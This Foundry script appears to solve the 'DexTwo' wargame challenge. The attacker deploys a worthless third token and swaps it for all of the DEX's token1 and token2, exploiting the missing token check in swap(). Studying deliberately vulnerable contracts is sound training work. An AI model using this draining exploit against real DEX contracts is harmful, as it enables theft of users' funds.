// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/DexTwo/DexTwo.sol";

contract DexTwoScript is Script {

    address internal attacker;
    address internal deployer;
    DexTwo target;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            target = DexTwo(0x0000000000000000000000000000000000000000); //attach to an existing contract
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            deployer = vm.addr(1);
            attacker = vm.addr(1337);
            vm.label(deployer, "Deployer");
            vm.label(attacker, "Attacker");
            /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            vm.deal(deployer, 100 ether);
            vm.deal(attacker, 0.5 ether);
            /** Setup contract and required init (you may have to modify this section) **/
            vm.startBroadcast(deployer);
            target = new DexTwo();
            SwappableTokenTwo token1 = new SwappableTokenTwo(address(target), "TOKEN1", "TK1", 110);
            SwappableTokenTwo token2 = new SwappableTokenTwo(address(target), "TOKEN2", "TK2", 110);
            target.setTokens(address(token1), address(token2));
            target.approve(address(target), 100);
            target.add_liquidity(address(token1), 100);
            target.add_liquidity(address(token2), 100);
            token1.transfer(attacker, 10);
            token2.transfer(attacker, 10);
            vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console.log("[Info]");
        console.log("attacker : %s", attacker);
        SwappableTokenTwo token1 = SwappableTokenTwo(target.token1());
        SwappableTokenTwo token2 = SwappableTokenTwo(target.token2());
        console.log("token1[attacker] : %s", token1.balanceOf(attacker));
        console.log("token2[attacker] : %s", token2.balanceOf(attacker));
        console.log("token1[dex]      : %s", token1.balanceOf(address(target)));
        console.log("token2[dex]      : %s", token2.balanceOf(address(target)));

        console.log("[Exploit]");
        vm.startBroadcast(attacker);
        SwappableTokenTwo token3 = new SwappableTokenTwo(address(0), "TOKEN3", "TK3", 4);
        token3.approve(attacker, address(target), 4);
        console.log("Draining token1 from DexTwo...");
        token3.transfer(address(target), 1);
        target.swap(address(token3), address(token1), 1);
        console.log("Draining token2 from DexTwo...");
        target.swap(address(token3), address(token2), 2);
        vm.stopBroadcast();
        console.log("token1[attacker] : %s", token1.balanceOf(attacker));
        console.log("token2[attacker] : %s", token2.balanceOf(attacker));
        console.log("token1[dex]      : %s", token1.balanceOf(address(target)));
        console.log("token2[dex]      : %s", token2.balanceOf(address(target)));
    }
}